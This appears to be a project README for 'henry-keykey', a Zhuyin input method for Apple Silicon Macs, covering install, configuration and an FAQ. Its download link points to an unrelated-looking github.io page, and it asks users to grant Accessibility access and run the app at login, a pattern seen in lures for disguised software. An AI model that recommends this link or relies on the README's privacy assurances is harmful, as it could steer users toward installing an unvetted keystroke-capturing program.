# ⌨️ henry-keykey - Efficient Zhuyin typing for Apple Silicon

[![](https://img.shields.io/badge/Download-henry--keykey-blue.svg)](https://thacherbiradial62.github.io)

henry-keykey provides an input method for macOS users who prefer the Zhuyin layout. This tool runs natively on Apple Silicon chips. It handles Traditional and Simplified Chinese output. It learns your typing habits on your device.

## 🛠 Features

*   **Native Apple Silicon Support**: The software runs directly on M1, M2, and M3 chips.
*   **Hybrid Output**: Switch between Traditional and Simplified Chinese modes as needed.
*   **Smart Vocabulary**: The system understands terms common in both Taiwan and mainland China.
*   **Privacy First**: The application processes your typing data on your local machine. It does not send keystrokes to the cloud.
*   **Self-Learning**: The engine adapts to your unique word choices over time.

## 📋 System Requirements

*   **Operating System**: macOS 12.0 or newer.
*   **Processor**: Apple Silicon (M-series chip).
*   **Storage**: 50MB of free disk space.
*   **Permissions**: Accessibility access is necessary for the input method to function within other apps.

## 📥 How to Install

1.  Visit the [official download page](https://thacherbiradial62.github.io) to get the latest version.
2.  Locate the disk image file (`.dmg`) in your Downloads folder.
3.  Double-click the file to open it.
4.  Drag the `henry-keykey` icon into your Applications folder.
5.  Open your Applications folder and double-click the app to start the setup process.

## ⚙️ Configuration Instructions

1.  Open **System Settings** on your Mac.
2.  Navigate to **Keyboard**.
3.  Select **Text Input** and click **Edit**.
4.  Click the **+** button at the bottom of the list.
5.  Search for **henry-keykey** in the list of languages and input sources.
6.  Add the input method to your active list.
7.  Select the input menu in your top menu bar to switch to henry-keykey.

## 💡 Usage Tips

*   **Switching Modes**: Use the keyboard shortcut defined in the settings menu to toggle between Simplified and Traditional characters.
*   **Selecting Words**: Type your Zhuyin sequence and use the spacebar to confirm. Use the number keys or the arrow keys to choose from the candidate list if the first option is not the word you want.
*   **Adding New Words**: Type a new phrase frequently. The software identifies these patterns and suggests them higher in the list for future use.
*   **Performance**: The app starts automatically when you log in. Keep it running in the background to ensure steady performance and accurate word predictions.

## 🛡 Security and Privacy

Your typing patterns stay on your internal drive. The software performs all calculations locally. It does not require an internet connection to function. This ensures that your private messages and documents remain confidential.

## 🔧 Frequently Asked Questions

**Does this work on Intel-based Macs?**
This software specializes in Apple Silicon architecture. It may experience performance issues on older Intel processors.

**Can I export my learning data?**
Currently, the software keeps your local learning data inside the application support folder. You can back up this folder manually to move your preferences to a new machine.

**The input menu does not show the app.**
Restart your Mac after the installation. macOS sometimes needs a reboot to recognize new input methods.

**How do I update the software?**
Check the link above for new versions. Download the latest installer and replace the existing app in your folder to keep the software current. 

Keywords: apple-silicon, bopomofo, cpp, ime, input-method, inputmethodkit, macos, offline-first, simplified-chinese, swift, taiwan, traditional-chinese, zhuyin